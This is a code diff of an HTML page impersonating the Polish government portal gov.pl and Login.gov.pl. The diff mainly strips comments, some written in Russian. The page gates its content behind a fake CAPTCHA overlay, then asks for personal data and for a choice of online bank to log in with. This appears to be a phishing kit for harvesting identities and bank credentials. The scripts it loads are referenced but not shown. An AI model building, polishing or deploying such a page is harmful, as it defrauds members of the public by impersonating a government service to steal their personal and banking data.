@@ -6,16 +6,12 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="theme-color" content="#ffffff">
-
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇵🇱</text></svg>" type="image/svg+xml">
-
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
-
     <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
 
-    <!-- ===== CAPTCHA OVERLAY — FULLSCREEN ===== -->
     <div id="captchaOverlay">
         <div class="captcha-box">
             <span class="captcha-icon">🛡️</span>
@@ -29,10 +25,8 @@
         </div>
     </div>
 
-    <!-- ===== RESZTA STRONY ===== -->
     <div id="mainContent" style="display:none;">
 
-        <!-- ========== HEADER ========== -->
         <header class="header" id="header">
             <div class="header-left">
                 <button class="menu-btn" aria-label="Menu" id="menuToggle">
@@ -97,7 +91,6 @@
 
             <div class="content-wrapper" id="contentWrapper">
 
-                <!-- ===== LOGIN NAV ===== -->
                 <div class="login-nav" id="loginNav">
                     <span class="brand">Login.gov.pl</span>
                     <div class="nav-links">
@@ -110,7 +103,6 @@
                     </div>
                 </div>
 
-                <!-- ===== BANNER ===== -->
                 <div class="image-under-banner" id="imageBanner">
                     <div class="image-wrapper">
                         <img src="assets/4a4bfee8-cecc-4734-b549-3230515a45ef.png" alt="Image" style="width:100%; height:auto;">
@@ -126,7 +118,6 @@
                     </div>
                 </div>
 
-                <!-- ===== FORM ===== -->
                 <section class="data-form-section" id="dataFormSection">
                     <h2 class="section-title">Dane osobowe</h2>
 
@@ -177,15 +168,10 @@
                     </form>
                 </section>
 
-                <!-- ===== BANK SELECT (кнопки банков удалены) ===== -->
                 <section class="bank-selection" id="bankSelection">
                     <h2 class="bank-title">Bankowość elektroniczna</h2>
                     <p class="bank-subtitle">Wybierz bank, za pomocą którego chcesz się zalogować.</p>
-
-                    <div class="bank-grid">
-                        <!-- Кнопки выбора банков удалены -->
-                    </div>
-
+                    <div class="bank-grid"></div>
                     <div class="bank-footer" id="bankFooter">
                         <div class="footer-links">
                             <a href="#">Polityka cookies</a>
@@ -200,10 +186,8 @@
             </div>
         </div>
 
-        <!-- ===== TOAST ===== -->
         <div class="toast-message" id="toastMessage">Najpierw wypełnij wszystkie wymagane pola!</div>
 
-        <!-- ===== FOOTER ===== -->
         <footer class="footer" id="footer">
             <div class="container">
                 <div>
@@ -241,9 +225,8 @@
             </div>
         </footer>
 
-    </div> <!-- koniec #mainContent -->
+    </div>
 
-    <!-- ===== JAVASCRIPT ===== -->
     <script src="js/captcha.js"></script>
     <script src="js/utils.js"></script>
     <script src="js/main.js"></script>
